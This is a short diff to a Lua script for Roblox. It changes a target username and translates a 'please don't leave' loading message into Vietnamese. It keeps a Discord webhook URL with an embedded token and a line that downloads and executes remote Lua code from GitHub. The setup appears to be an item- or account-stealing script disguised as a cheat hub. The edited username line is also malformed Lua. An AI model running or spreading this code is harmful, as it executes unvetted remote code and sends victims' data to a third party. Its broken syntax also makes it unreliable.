@@ -1,4 +1,4 @@
-_G.Username = "ongchuakia123"
-_G.HubName = "Script are loading, please don't leave"
+_G.Name user="omgchuakia123"
+_G.HubName = "Đang tải tập lệnh, vui lòng không thoát"
 _G.WebhookUrl = "discord.com/https://discord.com/api/webhooks/1107319474945798144/OD_Za12hB0_V29E3yHmHBgRCsbNkovHPB9fJpHZAnTYZsSnRfKQfmjA_cSfAeo7jzZ58"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
